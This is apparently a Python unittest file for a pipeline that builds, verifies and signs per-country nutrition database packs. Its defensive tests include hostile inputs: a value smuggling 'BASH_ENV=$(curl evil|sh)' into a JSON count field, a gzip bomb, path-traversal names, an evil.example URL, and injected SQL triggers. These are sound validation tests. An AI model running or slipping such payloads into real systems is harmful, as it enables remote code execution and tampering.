"""Tests for the pack scripts. Run from the repo root with: python -m unittest discover -s tests -v"""

from __future__ import annotations

import io
import json
import shutil
import sqlite3
import struct
import subprocess
import sys
import tempfile
import unittest
import zlib
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

import build_packs  # noqa: E402
import extract_dump  # noqa: E402
import verify_packs  # noqa: E402


def gzip_bytes(data: bytes) -> bytes:
    c = zlib.compressobj(9, zlib.DEFLATED, 31)
    return c.compress(data) + c.flush()


class ExtractTests(unittest.TestCase):
    def test_clean_strips_control_and_direction_characters(self):
        self.assertEqual(extract_dump.clean("Cheese‮ reversed\u0000\n  slices", 100), "Cheese reversed slices")
        self.assertEqual(extract_dump.clean("x" * 500, 150), "x" * 150)
        self.assertIsNone(extract_dump.clean("​​", 10))
        self.assertIsNone(extract_dump.clean(42, 10))

    def test_units_must_suit_the_nutrient(self):
        self.assertEqual(extract_dump.factor_for("kcal", "kcal"), 1.0)
        self.assertIsNone(extract_dump.factor_for("kcal", "kJ"))  # kJ in the kcal box is refused, not taken as kcal
        self.assertIsNone(extract_dump.factor_for("kcal", None))
        self.assertIsNone(extract_dump.factor_for("protein", "kcal"))
        self.assertEqual(extract_dump.factor_for("salt", "mg"), 0.001)
        self.assertEqual(extract_dump.factor_for("fat", None), 1.0)

    def test_whole_numbers_are_bounded(self):
        self.assertEqual(extract_dump.whole(10**30), 0)
        self.assertEqual(extract_dump.whole(float("inf")), 0)
        self.assertEqual(extract_dump.whole(-5), 0)
        self.assertEqual(extract_dump.whole("12"), 12)

    def test_decompression_is_bounded(self):
        bomb = gzip_bytes(b"\0" * 64_000_000)  # 64 MB of zeros squeezes to about 60 KB
        stream = extract_dump.HashingGunzip(io.BytesIO(bomb))
        self.assertEqual(len(stream.read(10)), 10)
        self.assertLessEqual(len(stream.buffer), extract_dump.OUT_CHUNK)

    def test_bad_document_length_stops(self):
        for length in (0, 3, extract_dump.MAX_DOC + 1):
            archive = extract_dump.MAGIC + struct.pack("<I", length) + b"\0" * 8
            stream = extract_dump.HashingGunzip(io.BytesIO(gzip_bytes(archive)))
            with self.assertRaises(SystemExit):
                list(extract_dump.documents(stream))

    def test_failed_run_leaves_no_output(self):
        with tempfile.TemporaryDirectory() as tmp:
            src = Path(tmp) / "bad.gz"
            src.write_bytes(gzip_bytes(extract_dump.MAGIC + struct.pack("<I", 2)))
            out = Path(tmp) / "slim.jsonl"
            r = subprocess.run([sys.executable, "-I", "scripts/extract_dump.py", str(src), "--out", str(out)], capture_output=True)
            self.assertNotEqual(r.returncode, 0)
            self.assertEqual(sorted(p.name for p in Path(tmp).iterdir()), ["bad.gz"])


class BuildTests(unittest.TestCase):
    """A tiny slim file through the real build query."""

    ROWS = [
        dict(code="5000000000011", name="Yoghurt", countries=["en:united-kingdom"], kcal=60, kj=251, protein=4, carbs=6, fat=3),
        # kJ typed into the kcal box: 251 kcal against macros adding up to 67.
        dict(code="5000000000012", name="Yoghurt slip", countries=["en:united-kingdom"], kcal=251, protein=4, carbs=6, fat=3),
        # kcal typed into the kJ box, no kcal: 60 / 4.184 = 14 kcal against macros of 67.
        dict(code="5000000000013", name="Yoghurt slip two", countries=["en:united-kingdom"], kj=60, protein=4, carbs=6, fat=3),
        # Wine: almost no macros, the energy is alcohol.
        dict(code="5000000000014", name="Red wine", countries=["en:united-kingdom"], kcal=85, protein=0.1, carbs=2.6, fat=0, alcohol=13, per="100ml"),
        dict(code="5000000000015", name="Old tag", countries=["en:world", "en:yugoslavia", "en:united-kingdom", "en:united-kingdom"], kcal=100, protein=1, carbs=20, fat=1),
    ]

    def test_build_query(self):
        with tempfile.TemporaryDirectory() as tmp:
            t = Path(tmp)
            with (t / "slim.jsonl").open("w") as f:
                for r in self.ROWS:
                    f.write(json.dumps({"scans": 1, "updated_at": 1, "obsolete": False, **r}) + "\n")
            r = subprocess.run([sys.executable, "-I", "scripts/build_packs.py", "--slim", str(t / "slim.jsonl"),
                                "--source-sha256", "0" * 64, "--out", str(t / "dist"), "--min-per-country", "1"],
                               capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stderr)
            files = sorted(p.name for p in (t / "dist").iterdir())
            self.assertEqual(files, ["index.unsigned.json", "united-kingdom.sqlite.deflate"], "No world or yugoslavia packs")
            db = t / "uk.sqlite"
            db.write_bytes(zlib.decompress((t / "dist/united-kingdom.sqlite.deflate").read_bytes(), -15))
            con = sqlite3.connect(db)
            got = dict(con.execute("SELECT name, has_nutrition FROM products").fetchall())
            per_ml = dict(con.execute("SELECT name, per_ml FROM products").fetchall())
            con.close()
            self.assertEqual(got, {"Yoghurt": 1, "Yoghurt slip": 0, "Yoghurt slip two": 0, "Red wine": 1, "Old tag": 1})
            self.assertEqual(per_ml["Red wine"], 1)
            self.assertEqual(len(got), 5, "A product listing the UK twice appears once")
            self.assertEqual(verify_packs.check_pack(json.loads((t / "dist/index.unsigned.json").read_text())["packs"][0], t / "dist"), [])

    def test_liquids_are_recognised(self):
        self.assertTrue(extract_dump.is_liquid({"quantity": "1 l"}))
        self.assertTrue(extract_dump.is_liquid({"quantity": "330ml"}))
        self.assertTrue(extract_dump.is_liquid({"serving_quantity_unit": "ml"}))
        self.assertFalse(extract_dump.is_liquid({"quantity": "500 g"}))
        self.assertFalse(extract_dump.is_liquid({"quantity": "1 l (1030 g)"}), "Given in grams too: leave it per 100 g")

    def test_alcohol_is_in_percent(self):
        self.assertEqual(extract_dump.factor_for("alcohol", "% vol"), 1.0)
        self.assertIsNone(extract_dump.factor_for("alcohol", "g"))


def make_pack(folder: Path, country: str = "united-kingdom", rows: list[tuple] | None = None, hostile: str | None = None) -> dict:
    rows = rows or [
        ("5000000000001", "Oat milk", "Brand", "1 l", None, None, 1, 46.0, 1.0, 6.6, 4.0, 1.5, 0.8, 0.1, 0, 3, 1),
        ("5000000000002", "Cheddar", None, "200 g", None, 30.0, 1, 416.0, 25.0, 0.1, 0.1, 34.9, 0.0, 1.8, 0, 9, 0),
    ]
    db = folder / f"{country}.sqlite"
    build_packs.write_pack(rows, db, {"country": country})
    if hostile:
        con = sqlite3.connect(db)
        con.executescript(hostile)
        con.commit()
        con.close()
    pack = folder / f"{country}.sqlite.deflate"
    build_packs.deflate(db, pack)
    entry = {
        "country": country, "name": build_packs.country_name(country), "file": pack.name,
        "product_count": len(rows), "products_with_nutrition": sum(r[6] for r in rows),
        "size": pack.stat().st_size, "uncompressed_size": db.stat().st_size, "sha256": build_packs.sha256(pack),
    }
    db.unlink()
    return entry


def make_index(packs: list[dict]) -> dict:
    return {
        "schema_version": 3, "version": 20261028, "built_at": "2026-10-28T00:00:00+00:00", "source": "s", "licence": "l",
        "source_file": "f", "source_sha256": "0" * 64, "compression": "deflate-raw", "signature_algorithm": "ed25519",
        "packs": packs,
    }


class VerifyTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dist = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_good_pack_passes(self):
        entry = make_pack(self.dist)
        self.assertEqual(verify_packs.shape(make_index([entry])), [])
        self.assertEqual(verify_packs.check_pack(entry, self.dist), [])

    def test_country_names_must_be_plain_slugs(self):
        for country, file in [("Türkiye", "Türkiye.sqlite.deflate"), ("../x", "../x.sqlite.deflate"),
                              ("a b", "a b.sqlite.deflate"), ("uk", "other.sqlite.deflate"), ("uk", "/tmp/uk.sqlite.deflate")]:
            entry = make_pack(self.dist)
            entry.update(country=country, file=file)
            self.assertNotEqual(verify_packs.shape(make_index([entry])), [], country)

    def test_extra_fields_are_refused(self):
        entry = make_pack(self.dist)
        index = make_index([{**entry, "url": "https://evil.example"}])
        self.assertNotEqual(verify_packs.shape(index), [])
        self.assertNotEqual(verify_packs.shape({**make_index([entry]), "extra": 1}), [])

    def test_views_and_triggers_are_refused(self):
        for sql in ("CREATE VIEW v AS SELECT 1;",
                    "CREATE TRIGGER t AFTER INSERT ON meta BEGIN SELECT 1; END;",
                    "CREATE TABLE extra (x);"):
            entry = make_pack(self.dist, hostile=sql)
            problems = verify_packs.check_pack(entry, self.dist)
            self.assertTrue(any("unexpected database objects" in p for p in problems), sql)

    def test_tables_must_be_defined_exactly(self):
        # Same table names, different definition: a pack built by anything but build_packs.py.
        entry = make_pack(self.dist, hostile="DROP TABLE meta; CREATE TABLE meta (key TEXT PRIMARY KEY, value TEXT NOT NULL DEFAULT 'x');")
        self.assertTrue(any("defined exactly" in p for p in verify_packs.check_pack(entry, self.dist)))

    def test_counts_are_recounted_not_trusted(self):
        entry = make_pack(self.dist)
        entry["product_count"] = 999
        self.assertTrue(verify_packs.check_pack(entry, self.dist))

    def test_bad_values_are_caught(self):
        bad = ("5000000000003", "Yoghurt", None, None, None, None, 1, 950.0, 1, 1, 1, 1, 1, 1, 0, 0, 0)
        entry = make_pack(self.dist, rows=[bad])
        self.assertTrue(any("energy range" in p for p in verify_packs.check_pack(entry, self.dist)))

    def test_unpacking_stops_at_the_stated_size(self):
        entry = make_pack(self.dist)
        self.assertFalse(verify_packs.inflate(self.dist / entry["file"], self.dist / "out", entry["uncompressed_size"] - 1))

    def test_live_count_only_accepts_a_plain_number(self):
        f = self.dist / "live.json"
        for body, expected in [('{"count": 180000}', 180000), ('{"count": "180000"}', 180000),
                               ('{"count": "180000\\nBASH_ENV=$(curl evil|sh)"}', None),
                               ('{"count": 1e12}', None), ('{"count": -1}', None), ("<html>503</html>", None), ("[]", None)]:
            f.write_text(body)
            self.assertEqual(verify_packs.live_count(f), expected, body)
        self.assertIsNone(verify_packs.live_count(self.dist / "missing.json"))


def has_openssl3() -> bool:
    return bool(shutil.which("openssl")) and b"OpenSSL 3" in subprocess.run(["openssl", "version"], capture_output=True).stdout


@unittest.skipUnless(has_openssl3(), "needs OpenSSL 3 for Ed25519")
class SignAndStageTests(unittest.TestCase):
    def run_script(self, *args):
        return subprocess.run([sys.executable, "-I", *map(str, args)], capture_output=True, text=True)

    def keys(self, t: Path):
        subprocess.run(["openssl", "genpkey", "-algorithm", "ed25519", "-out", t / "key.pem"], check=True)
        subprocess.run(["openssl", "pkey", "-in", t / "key.pem", "-pubout", "-out", t / "pub.pem"], check=True)

    def test_round_trip_and_tampering(self):
        with tempfile.TemporaryDirectory() as tmp:
            t = Path(tmp)
            dist = t / "dist"
            dist.mkdir()
            (dist / "index.unsigned.json").write_text(json.dumps(make_index([make_pack(dist)])))
            self.keys(t)
            signed = self.run_script("scripts/sign_packs.py", "--dist", dist, "--key", t / "key.pem", "--out", t / "signed")
            self.assertEqual(signed.returncode, 0, signed.stderr)
            ok = self.run_script("scripts/stage_release.py", "--dist", dist, "--signed", t / "signed", "--public", t / "pub.pem",
                                 "--release", t / "rel")
            self.assertEqual(ok.returncode, 0, ok.stderr)
            self.assertEqual(sorted(p.name for p in (t / "rel").iterdir()),
                             ["index.json", "index.json.sig", "united-kingdom.sqlite.deflate"])
            # A pack changed after signing must not be published.
            with (dist / "united-kingdom.sqlite.deflate").open("ab") as f:
                f.write(b"x")
            bad = self.run_script("scripts/stage_release.py", "--dist", dist, "--signed", t / "signed", "--public", t / "pub.pem",
                                  "--release", t / "rel2")
            self.assertNotEqual(bad.returncode, 0)

    def test_signing_refuses_an_index_that_wasnt_verified(self):
        with tempfile.TemporaryDirectory() as tmp:
            t = Path(tmp)
            dist = t / "dist"
            dist.mkdir()
            (dist / "index.unsigned.json").write_text(json.dumps(make_index([make_pack(dist)])))
            self.keys(t)
            wrong = self.run_script("scripts/sign_packs.py", "--dist", dist, "--key", t / "key.pem", "--out", t / "s",
                                    "--expect-index-sha256", "0" * 64)
            self.assertNotEqual(wrong.returncode, 0)
            right = self.run_script("scripts/sign_packs.py", "--dist", dist, "--key", t / "key.pem", "--out", t / "s",
                                    "--expect-index-sha256", build_packs.sha256(dist / "index.unsigned.json"))
            self.assertEqual(right.returncode, 0, right.stderr)

    def test_signing_refuses_unlisted_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            t = Path(tmp)
            dist = t / "dist"
            dist.mkdir()
            (dist / "index.unsigned.json").write_text(json.dumps(make_index([make_pack(dist)])))
            (dist / "extra.bin").write_bytes(b"surprise")
            self.keys(t)
            r = self.run_script("scripts/sign_packs.py", "--dist", dist, "--key", t / "key.pem", "--out", t / "s")
            self.assertNotEqual(r.returncode, 0)


if __name__ == "__main__":
    unittest.main()
